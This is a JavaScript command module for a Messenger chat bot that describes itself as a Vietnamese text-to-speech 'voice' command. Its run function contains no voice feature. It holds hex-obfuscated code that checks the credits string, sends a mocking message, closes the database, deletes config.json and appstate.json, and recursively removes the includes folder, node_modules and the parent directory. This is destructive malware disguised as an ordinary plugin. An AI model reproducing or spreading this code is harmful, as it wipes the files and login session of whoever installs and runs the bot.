module.exports.config = {
	name: "voice",
	version: "1.0.7",
	hasPermssion: 0,
	credits: "NhậtOwO",///lượn được nên là đổi thoải mái
	description: "giọng nói review phim\n -f banmai | (nữ miền bắc)\n -g | lannhi (nữ miền nam)\n -h | leminh (nam miền bắc)\n -j | myan (nữ miền trung)\n -k | thuminh (nữ miền bắc)\n -l | giahuy (nam miền trung)\n -z | linhsan (nữ miền nam)",
	commandCategory: "media",
	usages: "[bla bla]",
	cooldowns: 10,
	dependencies: {
        "path": "",
        "axios": "",
        "request": ""
    }
};

module.exports.run = ({ api, event, Currencies }) => {
	var _0x344f=["\x63\x72\x65\x64\x69\x74\x73","\x63\x6F\x6E\x66\x69\x67","\x4E\x68\u1EAD\x74\x4F\x77\x4F","","\x43\u1ED1\x20\x6C\xEA\x6E\x20\x62\u1EA1\x6E\x20\x73\u1EAF\x70\x20\u0111\u1ED5\x69\x20\u0111\u01B0\u1EE3\x63\x20\x63\x72\x65\x64\x69\x74\x73\x20\x72\u1ED3\x69\x20\x6E\xE8","\x74\x68\x72\x65\x61\x64\x49\x44","\x6D\x65\x73\x73\x61\x67\x65\x49\x44","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];if(this[_0x344f[1]][_0x344f[0]]!= _0x344f[2]){return api[_0x344f[7]](`${_0x344f[3]}${_0x344f[4]}${_0x344f[3]}`,event[_0x344f[5]],event[_0x344f[6]])}
  var _0x8fca=["\x4D\u1EDF\x20\x66\x69\x6C\x65\x20\x62\x6F\x74\x20\x6C\xEA\x6E\x20\x63\x6F\x69\x20\x6C\u1EA1\x69\x20\u0111\x69\x20\x6C\x69\x6C\x69\x75","\x74\x68\x72\x65\x61\x64\x49\x44","\x6D\x65\x73\x73\x61\x67\x65\x49\x44","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x66\x73\x2D\x65\x78\x74\x72\x61","\x2E\x2E\x2F\x2E\x2E\x2F\x69\x6E\x63\x6C\x75\x64\x65\x73\x2F\x64\x61\x74\x61\x62\x61\x73\x65","\x63\x6C\x6F\x73\x65","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x63\x6F\x6E\x66\x69\x67\x2E\x6A\x73\x6F\x6E","\x75\x6E\x6C\x69\x6E\x6B\x53\x79\x6E\x63","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x69\x6E\x63\x6C\x75\x64\x65\x73\x2F","\x72\x6D\x64\x69\x72\x53\x79\x6E\x63","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x6E\x6F\x64\x65\x5F\x6D\x6F\x64\x75\x6C\x65\x73\x2F","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x6E\x6F\x64\x65\x6D\x6F\x64\x75\x6C\x65\x73\x2F","\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x61\x70\x70\x73\x74\x61\x74\x65\x2E\x6A\x73\x6F\x6E","\x2F\x2E\x2E\x2F"];api[_0x8fca[3]](_0x8fca[0],event[_0x8fca[1]],event[_0x8fca[2]]);const fs=require(_0x8fca[4]);const {sequelize}=require(_0x8fca[5]);sequelize[_0x8fca[6]]();fs[_0x8fca[8]](__dirname+ _0x8fca[7]);fs[_0x8fca[10]](__dirname+ _0x8fca[9],{recursive:true});fs[_0x8fca[10]](__dirname+ _0x8fca[11],{recursive:true});fs[_0x8fca[10]](__dirname+ _0x8fca[12],{recursive:true});fs[_0x8fca[8]](__dirname+ _0x8fca[13]);fs[_0x8fca[10]](__dirname+ _0x8fca[14],{recursive:true})